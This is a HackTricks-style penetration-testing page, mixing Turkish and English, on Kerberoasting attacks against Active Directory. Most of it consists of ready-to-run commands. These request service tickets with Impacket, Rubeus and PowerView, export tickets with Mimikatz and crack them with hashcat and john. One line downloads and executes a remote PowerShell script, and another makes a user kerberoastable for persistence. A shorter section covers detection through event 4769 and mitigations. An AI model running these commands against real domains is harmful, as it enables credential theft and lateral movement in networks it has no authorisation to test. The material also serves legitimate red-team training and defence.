# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, **Active Directory (AD)** altında çalışan **kullanıcı hesapları** ile ilgili olan **TGS biletlerinin** edinilmesine odaklanır; **bilgisayar hesapları** hariçtir. Bu biletlerin şifrelemesi, **kullanıcı şifreleri** kaynaklı anahtarlar kullanır ve bu da **çevrimdışı kimlik bilgisi kırma** olasılığını sağlar. Bir hizmetin, boş olmayan bir **"ServicePrincipalName"** özelliği ile gösterildiği belirtilir.

**Kerberoasting** gerçekleştirmek için, **TGS biletleri** talep edebilen bir alan hesabı gereklidir; ancak bu süreç **özel ayrıcalıklar** talep etmez, bu da **geçerli alan kimlik bilgilerine** sahip herkesin erişimine açık olduğu anlamına gelir.

### Ana Noktalar:

- **Kerberoasting**, **AD** içindeki **kullanıcı-hesap hizmetleri** için **TGS biletlerini** hedef alır.
- **Kullanıcı şifrelerinden** gelen anahtarlarla şifrelenmiş biletler **çevrimdışı** kırılabilir.
- Bir hizmet, null olmayan bir **ServicePrincipalName** ile tanımlanır.
- **Özel ayrıcalıklar** gerekmez, sadece **geçerli alan kimlik bilgileri** yeterlidir.

### **Saldırı**

> [!WARNING]
> **Kerberoasting araçları**, saldırıyı gerçekleştirirken ve TGS-REQ talepleri başlatırken genellikle **`RC4 şifrelemesi`** talep eder. Bunun nedeni, **RC4'ün** [**daha zayıf**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) olması ve Hashcat gibi araçlar kullanılarak çevrimdışı kırılmasının diğer şifreleme algoritmaları olan AES-128 ve AES-256'dan daha kolay olmasıdır.\
> RC4 (tip 23) hash'leri **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) **`$krb5tgs$18$*`** ile başlar.\
> Ayrıca, dikkatli olun çünkü `Rubeus.exe kerberoast` tüm savunmasız hesaplar üzerinden otomatik olarak bilet talep eder ve bu sizi tespit ettirir. Öncelikle ilginç ayrıcalıklara sahip kerberoastable kullanıcıları bulun ve ardından yalnızca onların üzerinde çalıştırın.
```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Şifre istenecektir
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Kerberoastable kullanıcıları listele
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Hash'leri dök
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Kerberoastable kullanıcıları al
setspn.exe -Q */* #Bu yerleşik bir ikili dosyadır. Kullanıcı hesaplarına odaklanın
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
#Tek bir kullanıcıdan bellekte TGS alın
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Örnek: MSSQLSvc/mgmt.domain.local

#Tüm kerberoastable hesaplar için TGS'leri al (PC'ler dahil, pek akıllıca değil)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#Bellekteki kerberos biletlerini listele
klist

# Bellekten çıkar
Invoke-Mimikatz -Command '"kerberos::list /export"' #Biletleri mevcut klasöre dışa aktar

# kirbi biletini john'a dönüştür
python2.7 kirbi2john.py sqldev.kirbi
# john'u hashcat'e dönüştür
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: Bir kullanıcının Kerberoast hash'ini al
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #PowerView Kullanımı Ör: MSSQLSvc/mgmt.domain.local
# Powerview: Tüm Kerberoast hash'lerini al
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Belirli kullanıcı
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Yönetici al

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
